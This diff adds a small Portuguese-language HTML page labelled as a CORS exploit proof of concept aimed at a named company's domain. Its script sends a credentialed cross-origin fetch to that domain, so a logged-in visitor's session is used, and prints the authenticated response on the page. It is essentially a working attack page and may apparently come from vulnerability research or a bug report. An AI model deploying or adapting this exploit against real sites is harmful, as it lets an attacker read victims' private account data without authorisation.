@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <title>CORS PoC - Anduril</title>
+</head>
+<body>
+    <h1>CORS Exploit PoC - Anduril</h1>
+    <p>Se você estiver logado na Anduril, clique no botão abaixo para tentar ler dados autenticados.</p>
+
+    <button onclick="exploit()">Testar Leitura de Dados Autenticados</button>
+
+    <div id="result"></div>
+
+    <script>
+        function exploit() {
+            fetch("https://ac.andurildev.com", { 
+                method: "GET",
+                credentials: "include"   // envia cookies/sessão automaticamente
+            })
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById("result").innerHTML = `
+                    <strong>Sucesso!</strong><br>
+                    Dados recebidos (primeiros 500 caracteres):<br>
+                    <pre>${data.substring(0, 500)}</pre>
+                `;
+            })
+            .catch(err => {
+                document.getElementById("result").innerHTML = "Erro: " + err;
+            });
+        }
+    </script>
+</body>
+</html>
